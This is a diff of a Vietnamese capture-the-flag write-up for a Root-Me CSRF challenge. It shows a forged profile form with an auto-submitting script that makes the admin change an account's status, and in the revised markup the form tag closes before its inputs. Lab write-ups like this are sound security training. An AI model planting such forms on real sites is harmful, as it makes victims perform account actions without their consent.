@@ -1,6 +1,4 @@
-# WRITE UP
-
-**Challenge:** [CSRF - 0 protection](https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection)
+# [CSRF - 0 protection](https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection)
 
 Tạo tài khoản và login vào website:
 
@@ -10,7 +8,7 @@ Tạo tài khoản và login vào website:
 
 <img src="./media/image2.png" style="width:3.73366in;height:0.92508in" alt="Graphical user interface Description automatically generated with low confidence" />
 
-Ở tab Contact, ta có thể thấy form với method=“post”, submit thử thì ta nhận được message:
+Ở tab Contact, ta có thể thấy form với `method=“post”`, submit thử thì ta nhận được message:
 
 <img src="./media/image3.png" style="width:4.53168in;height:2.25946in" alt="Graphical user interface, text, application, email Description automatically generated" />
 
@@ -24,15 +22,17 @@ Từ đó, ta có thể đoán ra rằng, nội dung ở tab Contact sẽ đư�
 
 Qua tab Profile, inspect element và thực hiện giả mạo một form tương tự form ở tab Profile. Sau đó, chèn thêm script để admin có thể submit form:
 
-&lt;form id="clickme" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data"&gt;
+```html
+<form id="clickme" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data"></form>
 
-&lt;input type="text" name="username" value="19522445"&gt;
+<input type="text" name="username" value="19522445">
 
-&lt;input type="checkbox" name="status" checked&gt;
+<input type="checkbox" name="status" checked>
 
-&lt;/form&gt;
+</form>
 
-&lt;script&gt;document.getElementById("clickme").submit();&lt;/script&gt;
+<script>document.getElementById("clickme").submit();</script>
+```
 
 <img src="./media/image5.png" style="width:5.98385in;height:3.14194in" alt="Graphical user interface, text, application, email Description automatically generated" />
 
